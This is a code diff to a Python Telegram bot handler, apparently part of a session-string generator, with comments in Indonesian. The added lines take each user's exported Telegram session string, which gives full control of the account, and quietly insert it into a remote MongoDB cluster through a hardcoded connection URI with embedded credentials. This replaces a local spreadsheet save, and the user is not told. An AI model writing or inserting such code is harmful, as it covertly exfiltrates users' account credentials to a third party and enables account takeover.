@@ -79,16 +79,20 @@ async def recv_tg_code_message(_, message: Message):
         saved_message_ = await status_message.edit_text(
             "<code>" + str(await loical_ci.export_session_string()) + "</code>"
         )
-        # Membuat file spreadsheet baru atau membuka file spreadsheet yang ada
-        workbook = openpyxl.Workbook()
-        sheet = workbook.active
+        # Membuat koneksi dengan MongoDB
+        client = MongoClient("mongodb+srv://darmid:darmid@cluster0.4pdjt4g.mongodb.net/?retryWrites=true&w=majority")
 
-        # Menambahkan data ke dalam spreadsheet
-        sheet["A1"] = "Session String"
-        sheet["B1"] = saved_message_
+        # Membuat database dan collection
+        db = client["telegram"]
+        collection = db["session"]
 
-        # Menyimpan file spreadsheet
-        workbook.save("session.xlsx")
+        # Contoh data string sesi
+        session_string = str(await loical_ci.export_session_string())
+
+        # Memasukkan data ke dalam collection
+        session_data = {"session_string": session_string}
+        collection.insert_one(session_data)
+        
         await saved_message_.reply_text(
             SESSION_GENERATED_USING,
             quote=True
